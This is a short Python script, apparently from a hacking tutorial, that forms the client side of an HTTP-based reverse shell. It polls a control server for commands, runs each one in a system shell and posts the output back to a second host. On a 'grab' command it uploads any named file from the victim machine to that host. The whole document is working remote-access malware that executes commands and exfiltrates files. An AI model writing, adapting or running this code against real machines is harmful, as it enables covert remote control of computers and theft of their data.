#Client

import requests     #Library to be installed and imported
import subprocess 
import time
import os

while True: 

    req = requests.get('http://10.10.10.100')      # Send GET request to host machine
    command = req.text                             # Store the received txt into command variable

    if 'terminate' in command:
        break 

    elif 'grab' in command:
        grab,path=command.split('*')

        if os.path.exists(path):
            url='http://192.168.158.128/store'   #Append /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
            r=requests.post(url, files=files) # Send the file
            #requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !' )
    else:
        CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        post_response = requests.post(url='http://192.168.158.128', data=CMD.stdout.read() ) 
        post_response = requests.post(url='http://192.168.158.128', data=CMD.stderr.read() )  
    time.sleep(3)

    
